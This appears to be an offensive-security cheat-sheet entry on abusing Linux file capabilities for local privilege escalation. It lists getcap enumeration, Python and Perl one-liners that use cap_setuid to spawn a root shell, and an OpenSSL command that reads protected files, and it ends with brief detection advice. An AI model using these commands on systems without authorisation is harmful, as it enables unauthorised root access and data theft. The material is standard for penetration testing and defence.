---
technique: Linux Capabilities Abuse
category: privilege-escalation
targets: Linux File Capabilities
protocols: Local
remote_capable: false
tags: linux lpe capabilities cap-setuid cap-dac-read-search
---

# Linux Capabilities Abuse

Linux file capabilities grant narrow privileges to binaries without full SUID. Dangerous capabilities such as `cap_setuid`, `cap_dac_read_search`, and `cap_sys_admin` can create escalation paths.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Capability-bearing binary | A binary must have exploitable capabilities |
| Executable access | The current user must execute the binary |

## Linux

### List capabilities

#sh #capabilities

List files with assigned capabilities.

```sh title:"List file capabilities"
getcap -r / 2>/dev/null
```
<!-- cheat -->

### Check target capability

#sh #capabilities

Show capabilities for a specific binary.

```sh title:"Check binary capabilities"
getcap "$binary_path"
```
<!-- cheat
var binary_path
-->

### Python cap_setuid shell

#sh #cap-setuid

Use a Python binary with `cap_setuid` to start a root shell.

```sh title:"Spawn root shell with cap_setuid python"
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
<!-- cheat -->

### Perl cap_setuid shell

#sh #cap-setuid

Use a Perl binary with `cap_setuid` to start a root shell.

```sh title:"Spawn root shell with cap_setuid perl"
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'
```
<!-- cheat -->

### OpenSSL file read

#sh #cap-dac-read-search

Use an OpenSSL binary with read-bypass capabilities to read a protected file.

```sh title:"Read protected file with OpenSSL capability"
openssl enc -in "$target_file" -out "$output_file"
```
<!-- cheat
var target_file
var output_file
-->

## Detection

Monitor `setcap` changes, unexpected capabilities on interpreters, and capability-bearing binaries reading protected files or spawning shells.
